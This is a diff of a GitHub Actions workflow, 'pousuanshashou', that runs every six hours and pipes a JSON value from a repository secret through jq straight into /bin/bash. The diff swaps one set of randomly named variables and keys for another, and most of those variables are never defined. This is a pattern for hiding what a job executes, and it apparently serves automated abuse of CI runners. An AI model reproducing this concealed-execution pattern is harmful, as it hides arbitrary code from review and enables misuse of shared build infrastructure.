@@ -1,33 +1,20 @@
 name: pousuanshashou
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
-jobs:  # 6904
+    - cron: '56 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: pousuanshashou
         env:
-          mxzs3: ${{ secrets.mxzs3 }}
+          snlv4: ${{ secrets.snlv4 }}
         run: |
-          echo $mxzs3 | jq -r .x57425 | /bin/bash
-          echo $naztb0083 | jq -r .chlnq10 | /bin/bash
-          echo $ul35465 | jq -r .lh69 | /bin/bash
-          echo $gqsoi4038 | jq -r .qlpuv9316 | /bin/bash
-          echo $ozm63 | jq -r .okgm885 | /bin/bash
-          echo $g4 | jq -r .vv84946 | /bin/bash
-          echo $wi2 | jq -r .nz81 | /bin/bash
-          echo $ylmhm81 | jq -r .duziy653 | /bin/bash
-          echo $awrvo9247 | jq -r .jmpwh0 | /bin/bash
-          echo $i08 | jq -r .aa863 | /bin/bash
-          echo $x84845 | jq -r .eg114 | /bin/bash
-          echo $robp7367 | jq -r .srids3 | /bin/bash
-          echo $vz260 | jq -r .xre607 | /bin/bash
-          echo $bpke3 | jq -r .hxj66 | /bin/bash
-          echo $hxetd72 | jq -r .cqjt7 | /bin/bash
-          echo $yonw27 | jq -r .b29772 | /bin/bash
-          echo $z793 | jq -r .qwoat065 | /bin/bash
-          echo $t40166 | jq -r .uj3314 | /bin/bash
+          echo $snlv4 | jq -r .me8636 | /bin/bash
+          echo $mes76338 | jq -r .mecrq09177 | /bin/bash
+          echo $xpm72219 | jq -r .jwf66 | /bin/bash
+          echo $aklmu1090 | jq -r .vay43 | /bin/bash
 
